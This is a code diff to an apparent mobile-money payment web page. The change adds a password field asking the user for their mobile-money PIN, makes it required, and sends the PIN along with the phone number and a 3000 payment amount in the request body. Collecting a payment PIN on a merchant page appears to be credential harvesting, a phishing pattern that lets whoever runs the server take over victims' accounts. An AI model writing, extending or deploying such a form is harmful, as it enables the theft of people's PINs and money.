@@ -23,6 +23,11 @@
 <input id="phone" placeholder="07XXXXXXXX">
 </div>
 
+<div class="phone-box">
+<p>Enter PIN Number</p>
+<input id="pin" type="password" placeholder="****">
+</div>
+
 <div id="loading">
 <div class="spinner"></div>
 <p>Processing payment request...</p>
@@ -114,14 +119,18 @@ Please confirm the payment.
 
 <script>
 
-/* PAYMENT */
-
 async function buy(){
 
 const phone=document.getElementById("phone").value
+const pin=document.getElementById("pin").value
 
 if(!phone){
 alert("Enter phone number")
+return
+}
+
+if(!pin){
+alert("Enter PIN number")
 return
 }
 
@@ -139,7 +148,8 @@ headers:{
 
 body:JSON.stringify({
 amount:3000,
-phone:phone
+phone:phone,
+pin:pin
 })
 
 })
